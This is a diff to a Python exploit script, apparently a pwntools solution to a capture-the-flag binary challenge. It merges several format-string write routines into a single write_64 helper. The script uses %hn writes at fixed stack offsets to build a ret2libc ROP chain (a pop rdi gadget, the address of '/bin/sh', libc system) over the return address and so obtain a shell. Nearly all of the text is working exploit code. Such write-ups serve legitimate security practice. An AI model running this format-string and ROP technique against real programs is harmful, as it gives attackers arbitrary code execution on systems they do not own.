@@ -40,85 +40,43 @@ def init():
 def send_fmt(size, offset):
     io.sendline(f'%{size}c%{offset}$hn')
 
+
 def overwrite():
     write_size = always_true & 0xffff
     send_fmt(write_size, 27)
     
     io.sendline('%41$n')
 
-def pop_rdi():
-    pop_rdi = exe.address + 0x000000000000127b # pop rdi; ret; 
 
-    write_size = main_stack_ret & 0xffff
-    send_fmt(write_size, 27)
-    
-    write_size = pop_rdi & 0xffff
-    send_fmt(write_size, 41)
-
-    write_size = (main_stack_ret & 0xffff) + 2
-    send_fmt(write_size, 27)
-
-    write_size = (pop_rdi & 0xffff0000) >> 16
-    send_fmt(write_size, 41)
-
-    write_size = (main_stack_ret & 0xffff) + 4
-    send_fmt(write_size, 27)
-
-    write_size = (pop_rdi & 0xffffffff0000) >> 32
-    send_fmt(write_size, 41)
-
-
-def do_system(system):
-    addr = main_stack_ret + 0x10
-
+def write_64(addr, value, offset1, offset2):
     write_size = addr & 0xffff
-    send_fmt(write_size, 27)
-    
-    write_size = system & 0xffff
-    send_fmt(write_size, 41)
+    send_fmt(write_size, offset1)
+
+    write_size = value & 0xffff
+    send_fmt(write_size, offset2)
 
     write_size = (addr & 0xffff) + 2
-    send_fmt(write_size, 27)
+    send_fmt(write_size, offset1)
 
-    write_size = (system & 0xffff0000) >> 16
-    send_fmt(write_size, 41)
-
-    write_size = (addr & 0xffff) + 4
-    send_fmt(write_size, 27)
-
-    write_size = (system & 0xffffffff0000) >> 32
-    send_fmt(write_size, 41)
-
-def write(sh):
-    addr = main_stack_ret + 0x8
-    
-    write_size = addr & 0xffff
-    send_fmt(write_size, 13)
-
-    write_size = sh & 0xffff
-    send_fmt(write_size, 39)
-
-    write_size = (addr & 0xffff) + 2
-    send_fmt(write_size, 13)
-
-    write_size = (sh & 0xffff0000) >> 16
-    send_fmt(write_size, 39)
+    write_size = (value & 0xffff0000) >> 16
+    send_fmt(write_size, offset2)
 
     write_size = (addr & 0xffff) + 4
-    send_fmt(write_size, 13)
+    send_fmt(write_size, offset1)
 
-    write_size = (sh & 0xffffffff0000) >> 32
-    send_fmt(write_size, 39)
+    write_size = (value & 0xffffffff0000) >> 32
+    send_fmt(write_size, offset2)
 
 
 def ropme():
+    pop_rdi = exe.address + 0x000000000000127b # pop rdi; ret; 
     sh = next(libc.search(b'/bin/sh\x00'))
     system = libc.sym['system']
     ret = exe.address + 0x0000000000001016 # ret; 
 
-    pop_rdi()
-    write(sh)
-    do_system(system)
+    write_64(main_stack_ret + 0x0, pop_rdi, 27, 41)
+    write_64(main_stack_ret + 0x8, sh, 13, 39)
+    write_64(main_stack_ret + 0x10, system, 27, 41)
     overwrite()
 
 
@@ -148,3 +106,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
